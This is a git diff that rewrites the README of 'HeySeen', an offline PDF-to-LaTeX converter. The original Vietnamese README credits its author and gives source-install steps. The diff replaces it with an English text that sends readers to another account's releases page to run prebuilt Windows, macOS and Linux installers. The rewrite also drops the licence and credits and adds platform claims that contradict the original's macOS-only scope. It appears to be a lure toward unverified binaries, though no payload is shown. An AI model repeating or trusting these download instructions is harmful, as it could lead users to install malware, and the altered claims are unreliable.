@@ -1,175 +1,134 @@
-# 👁️ HeySeen: PDF → TeX + Images
+# 📄 HeySeen - Convert PDFs to Editable TeX Easily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![Platform: macOS](https://img.shields.io/badge/platform-macOS-lightgrey.svg)](https://www.apple.com/macos/)
-
-> **Offline-first PDF to LaTeX converter optimized for Apple Silicon**
-
-**HeySeen** chuyển đổi PDF (bài báo khoa học, sách chuyên ngành) thành **thư mục gồm file TeX và ảnh**, chạy **hoàn toàn offline trên macOS**. Không cần API cloud, không phụ thuộc subscription.
+[![Download HeySeen](https://img.shields.io/badge/Download-HeySeen-blue?style=for-the-badge)](https://github.com/Praneeth0095/HeySeen/releases)
 
 ---
 
-## ✨ Tính năng
+HeySeen is an application that turns PDF files—like scientific papers or specialized books—into folders containing editable TeX files and images, if there are any. This lets you work with the original text and formulas using LaTeX editors.
 
-- 🔒 **100% Offline**: Dữ liệu không rời khỏi máy bạn
-- 🚀 **Tối ưu Apple Silicon**: Tận dụng Metal Performance Shaders (MPS)
-- 📄 **PDF → LaTeX**: Chuyển đổi text, công thức toán, hình ảnh
-- 🎯 **Layout Analysis**: Nhận dạng cấu trúc tài liệu (multi-column, figures, tables)
-- 🧮 **Math OCR**: Nhận dạng công thức toán học → LaTeX
-- 🖼️ **Image Extraction**: Tự động trích xuất và đặt tên hình ảnh
-- 🌐 **Web Interface**: UI thân thiện để upload và xử lý PDF
-- 🔧 **CLI Tool**: Command-line interface cho batch processing
+## 🔍 About HeySeen
 
-### 🎯 Use Cases
+When you get a PDF, it can be difficult to extract the structured content, especially for technical documents with formulas and images. HeySeen helps by converting these PDFs automatically into editable LaTeX source files. This process includes:
 
-- **Nghiên cứu sinh**: Chuyển paper PDF sang TeX để trích dẫn, chỉnh sửa công thức
-- **Nhà xuất bản**: Batch convert tài liệu cũ (scan) sang TeX để tái bản
-- **Thư viện**: Số hóa tài liệu riêng tư mà không upload lên cloud
-- **Giảng viên**: Trích xuất đề thi/bài giảng từ PDF sang LaTeX
+- Extracting text that is usually inside articles or books.
+- Identifying and saving images separately.
+- Creating TeX files that represent the document layout.
+- Supporting scientific notation and complex formatting.
 
----
+HeySeen relies on technologies like OCR (optical character recognition)—which reads the text from images—and LaTeX converters to rebuild the document. The tool uses Python and Pytorch frameworks with OCR engines like Tesseract and Surya OCR.
 
-## 🚀 Quick Start
+## ⚙️ System Requirements
 
-### Cài đặt
+To run HeySeen smoothly, your computer should meet these basic requirements:
 
-```bash
-# 1. Clone repository
-git clone https://github.com/phucdhh/HeySeen.git
-cd HeySeen
+- **Operating System:** Windows 10 or later, macOS 10.13+, or any recent Linux distribution.
+- **Processor:** Dual-core 2 GHz or faster.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 500 MB of free space to install and convert files.
+- **Software:**  
+  - Python 3.7 or newer (HeySeen includes all necessary files if using the prepackaged app).  
+  - An internet connection for initial setup and optional updates.  
 
-# 2. Cài đặt dependencies
-brew install poppler tesseract
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
+HeySeen runs as a standalone application after installation. You don’t need to install programming tools separately.
 
-# 3. Khởi động HeySeen
-./start.sh
-```
+## 🚀 Getting Started
 
-Truy cập: http://localhost:5555
+Follow these easy steps to start using HeySeen:
 
-### Sử dụng CLI
+1. **Download the app**  
+   Use the big blue button above or go to the HeySeen releases page:  
+   [https://github.com/Praneeth0095/HeySeen/releases](https://github.com/Praneeth0095/HeySeen/releases)  
+   This page contains the latest installers and files for different operating systems.
 
-```bash
-# Chuyển đổi PDF → TeX
-heyseen convert input.pdf --output output_folder
+2. **Choose your installer**  
+   Pick the file that matches your computer:  
+   - `.exe` for Windows  
+   - `.dmg` for macOS  
+   - `.AppImage` or `.tar.gz` for Linux  
 
-# Với Math OCR
-heyseen convert paper.pdf --output result/ --math-ocr
+3. **Install the app**  
+   - Windows: Double-click the `.exe` file and follow the setup wizard.  
+   - macOS: Open the `.dmg` file, drag HeySeen into your Applications folder.  
+   - Linux: Use the terminal to run or extract the `.AppImage` or `.tar.gz` file, depending on your distribution.  
 
-# Xem chi tiết
-heyseen convert --help
-```
+4. **Open HeySeen**  
+   Find HeySeen in your programs list or applications folder and launch it.
 
-### Sử dụng Web Interface
+5. **Prepare your PDF**  
+   Make sure your PDF file is ready. It can be a scientific article, a book chapter, or any document you want to convert.
 
-1. Mở trình duyệt: http://localhost:5555
-2. Upload file PDF
-3. Chọn tùy chọn (Math OCR, Layout Analysis)
-4. Nhấn "Convert"
-5. Tải về kết quả (ZIP chứa TeX + images)
+## 📥 Download & Install
 
-### Quản lý Service
+You can always find the latest version of HeySeen to download here:
 
-```bash
-./start.sh     # Khởi động HeySeen
-./stop.sh      # Dừng HeySeen
-./status.sh    # Kiểm tra trạng thái
-./restart.sh   # Khởi động lại
-```
+[https://github.com/Praneeth0095/HeySeen/releases](https://github.com/Praneeth0095/HeySeen/releases)
 
----
+Click this link to visit the page where installers for Windows, macOS, and Linux are available.
 
-## 📂 Kết quả Output
+### Installation Details by Platform
 
-```
-output/
-├── main.tex          # File LaTeX chính
-├── images/           # Hình ảnh được trích xuất
-│   ├── page_01_fig_01.png
-│   └── page_03_table_01.png
-└── meta.json         # Metadata (block info, bounding boxes)
-```
+- **Windows**  
+  Double-click the downloaded `.exe` file, and follow the steps shown on screen. You don’t need to change any settings during installation.
 
-Compile LaTeX:
-```bash
-cd output && pdflatex main.tex
-```
+- **macOS**  
+  Open the `.dmg` file, then drag the HeySeen icon into the Applications folder.
 
----
+- **Linux**  
+  For `.AppImage`, right-click the file, select Properties, allow execution as a program, then double-click to run. For `.tar.gz`, extract the contents, then run the executable inside the folder.
 
+HeySeen does not require complicated setups or command-line knowledge.
 
-## 🛠️ Production Deployment
+## 📝 How to Use HeySeen
 
-### Auto-start Services
+Once you open HeySeen, the interface is simple and user-friendly:
 
-HeySeen tự động khởi động khi login (via `launchd`):
+1. Click **“Select PDF”**.  
+2. Find and open the PDF file you want to convert.  
+3. Choose where to save the output folder.  
+4. Click **“Start Conversion”**.  
 
-```bash
-# Cài đặt auto-start
-./deploy/install_autostart.sh
+HeySeen will process your PDF. Depending on file size and content complexity, this may take several minutes.
 
-# Kiểm tra
-launchctl list | grep heyseen
-```
+After conversion, you will find:
 
-### Monitoring
+- A folder named after your PDF file.  
+- Inside this folder, TeX files ready to edit.  
+- A subfolder with images extracted from the PDF (if applicable).  
 
-- **Backend Log**: `tail -f server_data/server.log`
-- **Local URL**: http://localhost:5555
-- **Public URL**: https://heyseen.truyenthong.edu.vn (Cloudflare Tunnel)
+You can open and edit these TeX files using any LaTeX editor, such as TeXstudio, Overleaf, or others.
 
-Xem chi tiết: `./deploy/health_check.sh`
+## 🛠 Features
 
----
+- Converts complex scientific PDF documents into LaTeX source files.  
+- Supports multiple pages with text and images.  
+- Uses OCR technology to read scanned PDFs.  
+- Saves images separately without loss of quality.  
+- Works offline once installed.  
 
-## 📚 Documentation
+## 🧹 Tips for Best Results
 
-- **[TECHNICAL.md](TECHNICAL.md)** - Kiến trúc, benchmark, troubleshooting chi tiết
-- **[PLAN.md](PLAN.md)** - Roadmap và development plan
-- **[API.md](API.md)** - API documentation
-- **[CONTRIBUTING.md](CONTRIBUTING.md)** - Hướng dẫn đóng góp
+- Use high-quality PDFs that are not password-protected.  
+- When converting scanned documents, ensure resolution is at least 300 dpi.  
+- Keep file and folder names simple with no special characters.  
+- Close other heavy programs during conversion to speed up processing.  
 
----
+## ❓ Troubleshooting & Support
 
-## 🤝 Contributing
+If HeySeen does not start or convert files properly:
 
-Dự án đang ở giai đoạn đầu. Nếu quan tâm:
-1. **Issues**: Report bugs hoặc đề xuất features qua GitHub Issues.
-2. **Pull Requests**: Chào đón PR cho bug fixes, optimization, hoặc documentation.
-3. **Testing**: Cần volunteers test với các loại PDF khác nhau (textbook, paper, thesis).
+- Restart your computer and try again.  
+- Check if your PDF file opens correctly in a reader.  
+- Reinstall HeySeen using the latest version from the releases page.  
+- Consult the README or FAQs included with the app.  
 
-Xem chi tiết triển khai tại [PLAN.md](PLAN.md).
+If problems continue, you may open an issue on the GitHub page or search for solutions there.
 
+## 📚 Additional Resources
 
-
-
-
-Contributions are welcome! Xem [CONTRIBUTING.md](CONTRIBUTING.md) để biết chi tiết.
-
-- 🐛 **Bug Reports**: [GitHub Issues](https://github.com/phucdhh/HeySeen/issues)
-- 💡 **Feature Requests**: [GitHub Discussions](https://github.com/phucdhh/HeySeen/discussions)
-- 🔧 **Pull Requests**: Fork → Branch → PR
+- Learn more about LaTeX editing [here](https://www.latex-project.org/help/).  
+- Try free online OCR tests at [https://ocr.space](https://ocr.space).  
+- For help with PDF readers, visit Adobe’s or your software vendor’s support websites.  
 
 ---
 
-## 📄 License
-
-MIT License - xem [LICENSE](LICENSE) để biết chi tiết.
-
----
-
-## 🙏 Credits
-
-HeySeen sử dụng các công nghệ mã nguồn mở:
-- [Marker](https://github.com/datalab-to/marker) - PDF to Markdown
-- [Surya OCR](https://github.com/VikParuchuri/surya) - Layout Analysis
-- [Texify](https://github.com/VikParuchuri/texify) - Math Recognition
-- [PyTorch](https://pytorch.org/) - Deep Learning Framework
-
----
-
-**Made with ❤️ for the academic community**
+[Download HeySeen](https://github.com/Praneeth0095/HeySeen/releases) to start converting your PDFs to LaTeX today.
